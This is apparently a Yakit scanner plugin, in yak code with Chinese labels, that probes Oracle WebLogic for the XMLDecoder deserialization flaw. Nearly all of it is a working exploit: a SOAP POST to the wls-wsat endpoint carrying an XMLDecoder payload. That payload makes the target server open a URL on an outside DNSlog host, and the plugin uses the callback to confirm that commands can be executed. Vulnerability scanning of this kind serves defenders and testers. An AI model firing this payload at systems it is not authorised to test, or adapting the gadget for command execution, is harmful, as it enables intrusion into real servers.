script_name: Oracle WebLogic Server XMLDecoder 反序列化漏洞
content:
yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="Oracle WebLogic Server XMLDecoder 反序列化漏洞"
    severity=level[3]
    type="命令执行"
    rand_Payload=str.RandStr(10)
    server,token,err = risk.NewDNSLogDomain()
    die(err)
    yakit.Info("dnslog server addr: %v ",server)
    yakit.Info("dnslog server check token: %v", token)

    reverseURL =  "http://"+rand_Payload+"."+server

    poc_url_r0= url + `/wls-wsat/RegistrationRequesterPortType`
    req_r0, _ := http.NewRequest("POST",poc_url_r0,
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.header(`Content-Type`,`text/xml`),
    http.body(`<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8" class="java.beans.XMLDecoder">
                <void id="url" class="java.net.URL">
                    <string>`+ parseStr(reverseURL) +`</string>
                </void>
                <void idref="url">
                    <void id="stream" method ="openStream"/>
                </void>
            </java>
        </work:WorkContext>
        </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
`),)
    breq,_=http.dump(req_r0)
    resp_r0, _ := http.Do(req_r0)
    bresp,_=http.dump(resp_r0)
    header, body = poc.Split(bresp)
    r0_flag = false
    detail, _ := risk.CheckDNSLogByToken(token)
    if len(detail) > 0 && str.Contains(detail[0],rand_Payload){
        r0_flag = true
    }

    poc_url=poc_url_r0
    if r0_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v", type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v", type)),
                risk.titleVerbose(sprintf("%v", reference)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
help: Oracle WebLogic Server是是一个Java应用服务器，它全面实现了J2EE 1.5规范、最新的Web服务标准和最高级的互操作标准。
